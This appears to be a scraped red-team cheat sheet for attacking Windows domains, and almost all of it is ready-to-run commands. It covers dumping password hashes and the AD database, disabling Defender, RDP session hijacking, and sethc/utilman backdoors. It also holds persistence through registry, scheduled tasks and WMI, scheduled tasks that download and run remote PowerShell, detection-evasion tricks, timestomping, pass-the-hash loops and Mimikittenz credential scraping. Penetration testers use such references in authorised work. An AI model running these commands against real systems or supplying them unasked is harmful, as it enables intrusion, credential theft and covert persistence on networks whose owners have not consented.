\\ offline C : Drive Dism / Mount - Wim / WimFile : z : \\ win7 \\ Acme_Win7 . wim / index : 2 / MountDir : C : \\ windows \\ temp \\ offline Dism / UnMount - Wim / MountDir : C : \\ windows \\ temp \\ offline / discard For loop example 1 for / D % f in ( \" C:\\Users\\username\\* \" ) do dir % f For loop, count lines 1 for / R \" C:\\users\\username\\desktop \" % f in ( * ) do find / c / v \"\" % f Check if file is locked 1 @echo off ; 2 > nul ( >> file . txt echo off ) && ( echo not locked ) || ( echo locked ) Lock a file for testing 1 ( >& 2 pause ) >> file . txt DSQUERY \u00b6 Get attributes for all Windows hosts in the Domain 1 dsquery * - filter \"(&(objectclass=computer) (objectcategory=computer) (operatingSystem=Windows*))\" - limit 0 | dsget computer - dn - samid - desc - loc > c : \\ windows \\ temp \\ computers . log Get attributes for computers in a specific OU 1 dsquery computer < OU = PUT OU HERE > - limit 0 | dsget computer - dn - samid - desc - l > c : \\ windows \\ temp \\ out . log Get attributes for users in the specified OU 1 dsquery user < OU = PUT OU HERE > - limit 0 | dsget user - dn - samid - display - desc - office - tel - email - title - hmdir - profile - loscr - mustchpwd - canchpwd - pwdneverexpires - disabled Get DC 1 dsquery server - forest or 1 dsquery server - o rdn - forest Get Domain Functional Level 1 dsquery * \"DC=corp,DC=test,DC=com\" - scope base - attr msDS - Behavior - Version ntMixedDomain Get Forest Functional Level 1 dsquery * \"CN=Partitions,CN=Configuration,DC=corp,DC=test,DC=com\" - scope base - attr msDS - Behavior - Version ntMixedDomain SQLCMD \u00b6 List Databases 1 sqlcmd - E - S localhost - Q \" EXEC sp_databases; \" List Tables in Database 1 sqlcmd - E - S localhost - Q \"SELECT * FROM DatabaseName.information_schema.tables;\" - W - w 999 - s \",\" - o \"c:\\windows\\temp\\RecruiterProd_MSCRM_tables.csv\" Retrieve table contents 1 sqlcmd - E - S localhost - d DatabaseName - Q \"SELECT * FROM SystemUserBase;\" - W - w 999 - s \",\" - o \"c:\\windows\\temp\\RecruiterProd_MSCRM_userbase.csv\" Dump MSSQL Password Hashes 1 sqlcmd - E - S localhost - Q \"SELECT name, password_hash FROM master.sys.sql_logins;\" NTDSUTIL \u00b6 Built-in utility to create backup copy of the AD database 1 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\" q q Applocker \u00b6 List Applocker's effective policy on the system 1 Get - ApplockerPolicy - Effective Windows Defender \u00b6 Remove definitions and disable AV protection (Useful when Powershell scripts are being blocked by Defender) 1 c : \\ program files \\ windows defender \\ mpcmdrun . exe \" - RemoveDefinitions - All Set - MpPreference - DisableIOAVProtection $ true APPCMD \u00b6 Get virtual directories in IIS 1 c : \\ windows \\ system32 \\ inetsrv \\ appcmd . exe list vdir / text : physicalpath Windows Lateral Movement \u00b6 RDP Hijacking If you have SYSTEM context on a host, you can assume the RDP sessions of other users without credentials using the tscon.exe command. Gain access to cmd.exe to issue the tscon.exe command over RDP by creating a backdoor with Stickkeys or Utilman. Use scheduled tasks (as SYSTEM) or create a service to execute the desired command. RDP hijacking\u200a\u2014\u200ahow to hijack RDS and RemoteApp sessions transparently to move through an organisation 1 2 3 4 5 6 7 8 9 10 11 12 13 14 # View RDP sessions on system your RDP ' d to with administrative permissions # Locally quser # Remote quser / server : < servername > # Create a service that will swap your SESSIONNAME with the desired disconnected session sc create sesshijack binpath = \"cmd.exe /k tscon 1 /dest:rdp-tcp#XX\" error = \"ignore\" # Start service net start sesshijack or sc start sesshijack Linux to Windows Remoting In windows run 1 2 winrm set winrm / config / Service / Auth @ { Basic = \"true\" } winrm set winrm / config / Service @ { AllowUnencrypted = \"true\" } In linux run 1 2 $ cred = Get - Credential Enter - PSSession - ComputerName 'winserver1' - Credential $ cred - Authentication Basic PowerShell Remoting over SSH 1 Enter - PSSession - Hostname < IP or FQDN > - Username james - SSHTransport Windows Persistence Methods \u00b6 Registry Keys \u00b6 Modify registry keys \u00b6 1 2 3 4 5 # Add a key / value reg add \\\\ < systemname > \\ < KEY > / v \"<value>\"\" /t <type (Binary,REG_SZ,etc)> /d <data> #Delete a key/value reg delete \\\\<systemname>\\<KEY> /v \" < value > \" Userinit Key \u00b6 This key specifies what program should be launched right after a user logs into Windows. The default program for this key is C:\\windows\\system32\\userinit.exe. Userinit.exe is a program that restores your profile, fonts, colors, etc for your user name. It is possible to add further programs that will launch from this key by separating the programs with a comma. 1 2 HKEY_LOCAL_MACHINE \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon \\ Userinit HKLM \\ Software \\ Microsoft \\ Windows NT \\ CurrentVersion \\ Winlogon \\ Userinit = ( REG_SZ ) C : \\ windows \\ system32 \\ userinit . exe , c : \\ windows \\ badprogram . exe Run Key \u00b6 1 2 3 4 5 6 7 # System Wide HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ RunOnce # Current Logged - On User Only HKEY_CURRENT_USER \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Run HKEY_CURRENT_USER \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ RunOnce List Image File Execution Options (Debugger file executed when the target file is run) \u00b6 1 HKLM \\ Software \\ MS \\ WindowsNT \\ CurrentVersion \\ Image File Execution Options \\ notepad . exe \\ debugger ( REG_SZ = cmd . exe ) AppInit_DLLs \u00b6 Load custom DLLs each time a program runs (If it loads USER32.dll). This is checked by most AV! This value corresponds to files being loaded through the AppInit_DLLs Registry value. The AppInit_DLLs registry value contains a list of dlls that will be loaded when user32.dll is loaded. As most Windows executables use the user32.dll, that means that any DLL that is listed in the AppInit_DLLs registry key will be loaded also. This makes it very difficult to remove the DLL as it will be loaded within multiple processes, some of which can not be stopped without causing system instability. The user32.dll file is also used by processes that are automatically started by the system when you log on. This means that the files loaded in the AppInit_DLLs value will be loaded very early in the Windows startup routine allowing the DLL to hide itself or protect itself before we have access to the system. 1 HKLM \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Windows \\ AppInit_DLLs No-reboot sethc/utilman option using a \"debugger\" key \u00b6 Navigate to HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ Make key called \"sethc.exe\" Make a REG_SQ value called \"Debugger\" Assign it \"c:\\windows\\system32\\cmd.exe\" as the value Hit SHIFT 5 times and get a shell as nt authority\\system 1 2 reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" / v Debugger / t REG_SZ / d \"c:\\windows\\system32\\cmd.exe\" reg add \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" / v Debugger / t REG_SZ / d \"c:\\windows\\system32\\cmd.exe\" Remove the debugger key 1 2 reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe\" / f reg delete \"\\\\hostname\\HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\utilman.exe\" / f File Storage Locations \u00b6 Startup Folders \u00b6 1 2 3 4 5 6 7 8 9 10 11 # All Users - Windows XP C : \\ Documents and Settings \\ All Users \\ Start Menu \\ Programs \\ Startup # All Users - Windows Vista + C : \\ ProgramData \\ Microsoft \\ Windows \\ Start Menu \\ Programs \\ Startup # User Profile - Windows XP C : \\ Documents and Settings \\ < USERNAME > \\ Start Menu \\ Programs \\ Startup # User Profile - Windows Vista + C : \\ Users \\ < USERNAME > \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ Start Menu \\ Programs \\ Startup SETHC/UTILMAN Replacement \u00b6 Replace these binaries, may require a reboot to take effect 1 2 %WINDIR%\\System32\\sethc.exe %WINDIR%\\System32\\utilman.exe Hit shift 5 times = sethc.exe run by SYSTEM Windows key + U = utilman.exe run by SYSTEM Volume Shadow Copy (Restore Points) \u00b6 Windows service that's constantly running - takes snapshots of system directories Drop Malware -> Create VSC (ReadOnly) -> Delete Malware -> Use WMIC to run VSC of malware Registry Key to Disable Volume Shadow Copy 1 HKLM \\ System \\ CurrentControlSet \\ Control \\ BackupRestore \\ FilesNotToSnapshot VSSADMIN - native windows utility \u00b6 vssadmin create command only applies to Server OS (Win2k3,2008) 1 2 3 4 5 vssadmin list shadows vssadmin create shadow / for = C : wmic / node : DC1 / user : DOMAIN \\ domainadminsvc / password : domainadminsvc123 process call create \" cmd /c vssadmin create shadow /for=C mklink / D C :\\ VscAccess \\\\?\\ GLOBALROOT \\ Device \\ HardDiskVolumeShadowCopy1 copy \\\\?\\ GLOBALROOT \\ Device \\ HardDiskVolumeShadowCopy4 \\ path \\ to \\ some \\ file e :\\ files Use WMIC process call to run an .exe from a Volume Shadow Copy \u00b6 1 wmic process call create \\\\ . \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ windows \\ system32 \\ evil . exe This process will not show the imagename (executable filename) or commandline parameters in the task list. The file cannot be individually deleted from the shadow copy once created. The entire shadow copy must be deleted to remove it. 1 2 root @kali : ~ # wmis - U DOMAIN \\ domainadminsvc % domainadminsvc123 // ServerName \\\\ ? \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ Windows \\ system32 \\ evil . exe NTSTATUS : NT_STATUS_OK - Success In Kali Linux you could use the WMIS package to do the same thing: 1 2 wmis - U DOMAIN \\ domainadminsvc % domainadminsvc123 // ServerName \\\\ ? \\ GLOBALROOT \\ Device \\ HarddiskVolumeShadowCopy1 \\ Windows \\ system32 \\ evil . exe NTSTATUS : NT_STATUS_OK - Success Task Scheduling \u00b6 AT \u00b6 Executes as system and must be an Admin to run it. Check groups with whoami /groups 1 2 3 4 5 at 13 : 20 / interactive cmd net user \\\\ target / user : Domain \\ user pass net time \\\\ target at \\\\ target 13 : 20 c : \\ temp \\ evil . bat SCHTASKS \u00b6 Any user can create a task Schedule a binary to run with arguments on system events 1 2 3 4 5 6 7 8 9 10 11 # On System Startup schtasks / create / TN OfficeUpdaterA / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onstart / RU system / RL HIGHEST schtasks / create / TN OfficeUpdaterD / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onstart / RU system / RL HIGHEST # On User Login schtasks / create / TN OfficeUpdaterB / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onlogon schtasks / create / TN OfficeUpdaterE / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onlogon # On Idle schtasks / create / TN OfficeUpdaterC / tr \"\" c : \\ evil32 . exe \" -k password -n services\" / SC onidle / i 30 '''' schtasks / create / TN OfficeUpdaterF / tr \"\\\" c : \\ Program Files \\ evil32 . exe \\ \" -k password -n services\" / SC onidle / i 60 Use the Powershell Web Delivery (Download and Execute) module in Metasploit 'exploit\\windows\\misc\\psh_web_delivery' 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 # ( X86 ) - On User Login schtasks / create / tn OfficeUpdaterA / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onlogon / ru System # ( X86 ) - On System Start schtasks / create / tn OfficeUpdaterB / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onstart / ru System # ( X86 ) - On User Idle ( 30 mins ) schtasks / create / tn OfficeUpdaterC / tr \"c:\\windows\\system32\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onidle / i 30 # ( X64 ) - On User Login schtasks / create / tn OfficeUpdaterA / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onlogon / ru System # ( X64 ) - On System Start schtasks / create / tn OfficeUpdaterB / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://<ip address>/<uri>'''))'\" / sc onstart / ru System # ( X64 ) - On User Idle ( 30 mins ) schtasks / create / tn OfficeUpdaterC / tr \"c:\\windows\\syswow64\\WindowsPowerShell\\v1.0\\powershell.exe -WindowStyle hidden -NoLogo -NonInteractive -ep bypass -nop -c 'IEX ((new-object net.webclient).downloadstring('''http://192.168.95.195:8080/kBBldxiub6'''))'\" / sc onidle / i 30 Additional Notes \u00b6 Scheduled Tasks binary paths CANNOT contain spaces because everything after the first space in the path is considered to be a command-line argument. To workaround this behavior, enclose the /TR path parameter between backslash () AND quotation marks (\"): Delete scheduled task without prompting 1 schtasks / delete / f / TN taskname Detailed scheduled tasks listing 1 schtasks / query / V / FO list View scheduled tasks log (for troubleshooting) 1 2 3 notepad c : \\ windows \\ schedlgu . txt ( Windows XP ) notepad c : \\ windows \\ tasks \\ schedlgu . txt ( Vista + ) Windows Service \u00b6 1 2 3 sc query sc create < \\\\ Target ( optional ) > < servicename > binPath = < service binary path > type = share start = auto DisplayName = < display name > sc delete < servicename > DLL-Hijacking \u00b6 Order of DLL Loading 1 2 3 4 5 6 1 . The directory from which the application is loaded 2 . The current directory 3 . The system directory , usually C : \\\\ Windows \\\\ System32 \\\\ ( The GetSystemDirectory function is called to obtain this directory .) 4 . The 16 - bit system directory - There is no dedicated function to retrieve the path of this directory , but it is searched as well . 5 . The Windows directory . The GetWindowsDirector function is called to obtain this directory . 6 . The directories that are listed in the PATH environment variable . Many systems use bginfo (seen it a lot in operational sys). Drop Riched32.dll in the dir with bginfo.exe. Codex. Older list of dlls as well (2010). https://www.exploit-db.com/dll-hijacking-vulnerable-applications/ On Windows 7 there are three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : \\ windows \\ ehome \\ Mcx2Prov . exe C : \\ Windows \\ ehome \\ CRYPTBASE . dll C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ Windows \\ System32 \\ sysprep \\ CRYPTSP . dll C : \\ windows \\ System32 \\ sysprep \\ CRYPTBASE . dll C : \\ Windows \\ System32 \\ sysprep \\ RpcRtRemote . dll C : \\ Windows \\ System32 \\ sysprep \\ UxTheme . dll C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL On Windows 8 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ windows \\ System32 \\ sysprep \\ CRYPTBASE . dll C : \\ Windows \\ System32 \\ Sysprep \\ dwmapi . dll C : \\ Windows \\ System32 \\ Sysprep \\ SHCORE . dll C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL C : \\ windows \\ System32 \\ pwcreator . exe C : \\ Windows \\ System32 \\ vds . exe C : \\ Windows \\ System32 \\ UReFS . DLL Windows 8.1 there are also three executables that could be exploited and associated DLLs listed below 1 2 3 4 5 6 7 8 9 10 11 12 13 14 C : \\ windows \\ System32 \\ sysprep \\ sysprep . exe C : \\ Windows \\ System32 \\ Sysprep \\ SHCORE . dll C : \\ Windows \\ System32 \\ Sysprep \\ OLEACC . DLL C : \\ windows \\ System32 \\ cliconfg . exe C : \\ Windows \\ System32 \\ NTWDBLIB . DLL C : \\ windows \\ System32 \\ pwcreator . exe C : \\ Windows \\ System32 \\ vds . exe C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ CRYPTBASE . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ CRYPTSP . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ dwmapi . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ USERENV . dll C : \\ Program Files \\ Common Files \\ microsoft shared \\ ink \\ OLEACC . dll linkinfo.dll Replacement \u00b6 Windows explorer in older systems loads linkinfo.dll from c:\\windows over c:\\windows\\system32 if it exists 1 copy evil . dll c : \\ windows \\ linkinfo . dll WMI Event Persistence via Powershell \u00b6 WMI Event persistence explained, you can find a bloated version in powersploit. Three parts to this: * WMI Event Filter * Event Consumer * Filter/Consumer Binding This technique gets you SYSTEM level persistence, requires admin rights to execute. Autoruns doesn't even check for this yet. (doubt any AVs are either) Difficult to detect, Difficult to remove if you dont know what youre doing. WMI Event Filter \u00b6 Create an event that checks every 60 seconds for a change in Win32_PerfFormattedData_PerfOS_System. (this is always changing) 1 2 3 4 5 6 7 $ EventFilter = ( [ WMICLASS ] \"\\\\.\\root\\subscription:__EventFilter\" ). CreateInstance () $ EventFilter . QueryLanguage = \"WQL\" $ EventFilter . Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System' AND TargetInstance.SystemUpTime >= 240 AND TargetInstance.SystemUpTime < 325\" $ EVentFilter . EventNamespace = \"root\\cimv2\" $ EventFilter . Name = \"OBVIOUSHACKER\" $ Result = $ EventFilter . Put () $ Filter = $ Result . Path http://msdn.microsoft.com/en-us/library/aa394639(v=vs.85).aspx Event Consumer \u00b6 Configure what to execute once the event occurs. Current example is just a ping. 1 2 3 4 5 6 $ InstanceConsumer = ( [ wmiclass ] \"\\\\.\\root\\subscription:CommandLineEventConsumer\" ). CreateInstance () $ InstanceConsumer . Name = \"OBVIOUSHACKER\" $ InstanceConsumer . CommandLineTemplate = \"ping 127.0.0.1 -n 100\" #CMD TO EXECUTE HERE $ InstanceConsumer . WorkingDirectory = \"C:\\\\windows\\\\system32\" $ Result = $ InstanceConsumer . Put () $ Consumer = $ Result . Path http://msdn.microsoft.com/en-us/library/aa389231(v=vs.85).aspx http://msdn.microsoft.com/en-us/library/aa393649(v=vs.85).aspx Filter/Consumer Binding \u00b6 This is the object that correlates the Filter with the Consumer. Runs as system as a child of WmiPrvSE.exe under the svchost.exe running Dcom service. 1 2 3 4 $ InstanceBinding = ( [ wmiclass ] \"\\\\.\\root\\subscription:__FilterToConsumerBinding\" ). CreateInstance () $ InstanceBinding . Filter = $ Filter $ InstanceBinding . Consumer = $ Consumer $ Result = $ InstanceBinding . Put () http://msdn.microsoft.com/en-us/library/aa394647(v=vs.85).aspx REMOVAL \u00b6 The filter name would change depending on what you call the wmi event on your target (OBVIOUSHACKER shown as the example) 1 2 3 Get - WmiObject __eventFilter - namespace root \\ subscription - filter \"name='OBVIOUSHACKER'\" | Remove - WmiObject Get - WmiObject CommandLineEventConsumer - Namespace root \\ subscription - filter \"name='OBVIOUSHACKER'\" | Remove - WmiObject Get - WmiObject __FilterToConsumerBinding - Namespace root \\ subscription | Where - Object { $ _ . filter - match 'OBVIOUSHACKER' } | Remove - WmiObject Some more detailed information on the subject http://www.bleepingcomputer.com/tutorials/windows-program-automatic-startup-locations/ Malicious Outlook Rules \u00b6 https://labs.mwrinfosecurity.com/blog/malicous-outlook-rules/ Ruler https://github.com/sensepost/ruler Windows Remote Management (WinRM) / PSRemoting \u00b6 Listens on 5985/5986 by default and allows interactive shell access over HTTP/S Find by scanning for /wsman and looking for HTTP 402 errors (or use Metasploit module) Metasploit has multiple modules for locating the service and gaining shells over WinRM Connect to a remote host with WinRM from local Windows host 1 2 3 4 5 6 Enable - PSRemoting Set - Item - Path WSMan : \\ localhost \\ Client \\ TrustedHosts * - force or Set - Item - Path WSMan : \\ localhost \\ Client \\ TrustedHosts - value \"<host>\" - Force $ cred = Get - Credential Invoke - Command - ComputerName < host > - ScriptBlock { gci c : \\ } - credential $ cred Uninstall a patch to leave the system vulnerable \u00b6 1 wusa . exe / uninstall / kb : 976932 Create custom DLL for password filters and install on DC to capture changed passwords \u00b6 http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html Application Whitelisting Bypass Techniques \u00b6 SubTee Collection of Whitelist Bypass Techniques https://bitbucket.org/jsthyer/wevade.git Version .0.0.3 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 1. IEExec - This technique may work in certain environments . Its relies on the fact that many organizations trust executables signed by Microsoft . We can misuse this trust by launching a specially crafted . NET application . Example Here : https : // room362 . com / post / 2014 / 2014 - 01 - 16 - application - whitelist - bypass - using - ieexec - dot - exe / 2. Rundll32 . exe 3. ClickOnce Applications dfsvc . exe dfshim . dll 4. XBAP - XML Browser Applications WPF PresentationHost . exe 5. MD5 Hash Collision http : // www . mathstat . dal . ca /~ selinger / md5collision / 6. PowerShell - Specifically Reflective Execution http : // clymb3r . wordpress . com / 2013 / 04 / 06 / reflective - dll - injection - with - powershell / https : // www . defcon . org / images / defcon - 21 / dc - 21 - presentations / Bialek / DEFCON - 21 - Bialek - PowerPwning - Post - Exploiting - by - Overpowering - Powershell . pdf 7. . HTA Application Invoke PowerShell Scripts Launched by mshta . exe , bypasses IE security settings as well . 8. bat , vbs , ps1 1. cmd . exe / k < script . txt 2. cscript . exe // E : vbscript script . txt 3. Get - Content script . txt | iex 9. Malicious Troubleshooting packs - MSDT . exe Reference : http : // cybersyndicates . com / 2015 / 10 / a - no - bull - guide - to - malicious - windows - trouble - shooting - packs - and - application - whitelist - bypass / Thanks to @nberthaume , @Killswitch_GUI 10. InstallUtil . exe A signed MS binary that loads assemblies and executes - One of the best . Examples here : https : // gist . github . com / subTee 11. Regsvcs / Regasm See : https : // gist . github . com / subTee / fb09ef511e592e6f7993 These 2 are Excellent . 12. regsvr32 . exe https : // gist . github . com / subTee / 24 c7d8e1ff0f5602092f58cbb3f7d302 This one is just simply amazing ... regsvr32 / s / n / u / i : http : // example . com / file . sct scrobj . dll 13. Msbuild . exe http : // subt0x10 . blogspot . com / 2016 / 09 / bypassing - application - whitelisting . html Certutil \u00b6 https://gist.github.com/subTee/7937a8ef07409715f15b84781e180c46 File download 1 certutil - urlcache - split - f http : // example . com / file Active Directory Enumeration \u00b6 Adfind \u00b6 www.joeware.net/freetools/tools/adfind/ 1 2 3 4 5 AdFind . exe - u account @domain . com - up password - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=computer\" > domain_computers . txt AdFind . exe - u account @domain . com - up password - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=computer\" distinguishedName dNSHostName description whenchanged operatingSystem operatingSystemVersion > domain_computers_light . txt AdFind . exe - u account @domain . com - up pass - h 10.4.128.40 : 389 - b dc = domain , dc = com - f \"objectcategory=user\" samaccountname description pwdlastset orclcommonattribute > domain_users_light . txt Powershell \u00b6 List help for cmdlet: Get - Help [ cmdlet ] - full List available properties and methods: Get - Member For-each loop: ForEach - Object { $ _ } Search for string (like grep): Select - String - path [ file ] - pattern [ string ] Timestomp 1 2 3 4 5 $ file =( gi c : \\ file . exe ); $ date = '01/03/2009 12:12 pm' ; $ file . LastWriteTime =$ date ; $ file . LastAccessTime =$ date ; $ file . CreationTime =$ date Show last system boot time 1 Get-WmiObject win32_operatingsystem | select csname, @ { LABEL = 'LastBootUpTime' ; EXPRESSION = { $_.ConverttoDateTime ( $_.lastbootuptime ) }} Wrap binary execution in a powershell loop 1 powershell foreach ($ target in ( get-content c : \\ users \\ username \\ appdata \\ local \\ temp \\ hosts_da_loggedin_unique . txt )) { \" [ * ] $ Target : \" ; ( c : \\ programdata \\ sd . exe ./ administrator @ $ target - hashes aad3b435b51404eeaad3b435b51404ee : a4bab1c7d4bef62d4c22043ddbf1312c ) } ` Download a file 1 [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true } ;(new-object system.net.webclient).downloadfile(\"https://www.mydomain.com/file\",\"C:\\Users\\username\\AppData\\Local\\Temp\\file.txt\") Encode string 1 echo \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" | iconv --to-code UTF-16LE | base64 -w 0 List recently modified files in path (U:) 1 Get - Childitem u : \\ - Recurse | where - object { ! ( $ _ . psiscontainer ) } | where { $ _ . LastWriteTime - gt $ ( Get - Date ). AddDays ( - 1 ) } | foreach { \"$($_.LastWriteTime) :: $($_.Fullname) \" } List Files 1 Select - String - Path c : \\ fso \\ * . txt , c : \\ fso \\ * . log - pattern ed List First 100 Files 1 Get - ChildItem - Path XXX | Select - First 100 Fullname List a Process's Loaded Modules (DLL) 1 get - process - id 1234 | select - expand modules Remote Command Execution using MMC 1 https : // enigma0x3 . net / 2017 / 01 / 05 / lateral - movement - using - the - mmc20 - application - com - object / Get LocalAccountTokenFilterPolicy (Determine if you can authenticate to admin resources over the network, i.e. C ,ADMIN ,ADMIN ) 1 Get - ItemProperty HKLM : \\ SOFTWARE \\ Microsoft \\ Windows \\ CurrentVersion \\ Policies \\ System \\ | Select LocalAccountTokenFilterPolicy | fl Test User Credentials 1 powerpick $ password = ConvertTo - SecureString \"PlainTextPassword\" - AsPlainText - Force ; $ cred = New - Object System . Management . Automation . PSCredential ( \"domain\\name\" , $ password ); Search for SSN https://technet.microsoft.com/en-us/library/2008.04.securitywatch.aspx 1 $ SSN_Regex = \" [0-9]{3}[-| ][0-9]{2}[-| ][0-9]{4}\" ; Get - ChildItem . - Recurse - exclude * . exe , * . dll | Select - String - Pattern $ SSN_Regex | Select - String - Pattern $ SSN_Regex | Select - Object Path , Filename , Matches | ft - auto | out - string - width 200 ; \"[*] SSN Search Complete!\" Enumerate the use of the Windows Server Update Services (WSUS) 1 2 3 4 5 6 7 Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" | Select - Object - ExpandProperty WUServer Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\" | Select - Object - ExpandProperty WUStatusServer Get - ItemProperty - Path Registry :: \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU\" | Select - Object - ExpandProperty UseWUServer reg query HKEY_LOCAL_MACHINE \\ SOFTWARE \\ Policies \\ Microsoft \\ Windows \\ WindowsUpdate Get unquoted service paths 1 gwmi win32_service | Select pathname | Where { ( $ _ . pathname - ne $ null ) } | Where { - not $ _ . pathname . StartsWith ( \"`\"\")} | Where {($_.pathname.Substring(0, $_.pathname.IndexOf(\" . \") +4)) -match \" . * . * \"} Find-Files (custom) \u00b6 1 Find - Files - searchBase \"i:\\\" - searchTerms \"*web.xml*,*web.config*,*password*,*tomcat-users.xml*\" - LogPath \"C:\\Users\\username\\AppData\\Local\\Temp\" Get-Enumeration (custom) \u00b6 Run Local and Domain enumeration functions on the local host. 1 Get - Enumeration - Path . - Local - Domain Download and execute IEX \u00b6 1 powershell - nop - w hidden - c \"iex (New-Object Net.WebClient).DownloadString('http://192.168.1.1:80/file')\" EncodedCommand and IEX detection bypass \u00b6 Author: Dave Kennedy Source: https://www.trustedsec.com/blog/circumventing-encodedcommand-detection-powershell/ Avoid detection of -enc 1 powershell - window hidden - C \"set-variable -name \" C \" -value \" - \"; set-variable -name \" s \" -value \" e \"; set-variable -name \" q \" -value \" c \"; set-variable -name \" P \" -value ((get-variable C).value.toString()+(get-variable s).value.toString()+(get-variable q).value.toString()) ; powershell (get-variable P).value.toString() <b64encodedcommandhere>\" Avoid detection of IEX 1 powershell - window hidden - C \"set-variable -name \" LB \" -value \" I \"; set-variable -name \" I \" -value \" E \"; set-variable -name \" V \" -value \" X \"; set-variable -name \" wP \" -value ((get-variable LB).value.toString()+(get-variable I).value.toString()+(get-variable V).value.toString()) ; powershell (get-variable wP).value.toString() ('<YOURINVOKEEXPRESSIONSTUFFHERE>')\" Bloodhound \u00b6 1 2 3 iex (( new-object system . net . webclient ) . downloadstring ( 'https://raw.githubusercontent.com/BloodHoundAD/BloodHound/master/PowerShell/BloodHound.ps1' )); Invoke-Bloodhound -CSVFolder c : \\ temp -CSVPrefix < prefix > Invoke-BloodHound -DomainController < domain IP > -Domain < FQDN > -CSVFolder C : \\ users \\ public \\ libraries -CSVPrefix < prefix > -CollectionMethod Stealth Mimikittenz \u00b6 https://github.com/putterpanda/mimikittenz mimikittenz is a post-exploitation powershell tool that utilizes the Windows function ReadProcessMemory() in order to extract plain-text passwords from various target processes. mimikittenz can also easily extract other kinds of juicy info from target processes using regex patterns including but not limited to: TRACK2 (CreditCard) data from merchant/POS processes PII data Encryption Keys & All the other goodstuff Execution 1 Invoke - Mimikittenz Customizations 1 2 3 4 5 Custom regex - The syntax for adding custom regex is as follows : [ mimikittenz . MemProcInspector ]:: AddRegex ( \" <NameOfTarget> \" , \" <regex_here> \" ) Custom target process - Just append your target proccess name into the array : [ mimikittenz . MemProcInspector ]:: InspectManyProcs ( \" iexplore \" , \" chrome \" , \" firefox \" ) PowerUp \u00b6 Performs multiple local host privilege escalation checks for common Windows misconfigurations. 1 Invoke - AllChecks See cheat sheet for more commands PowerView \u00b6 Requires domain user privileges Find Administrative users logged in across the domain - default group = Domain Admins) 1 2 Invoke - UserHunter - Threads 15 - NoPing [ - GroupName \u201c Enterprise Admins \u201d ] Invoke - UserHunter - Threads 20 - GroupName \"Domain Admins\" - SearchForest - CheckAccess Find User (Stealthy via Fileshares) 1 Invoke - UserHunter - Stealth - Threads 5 - NoPing 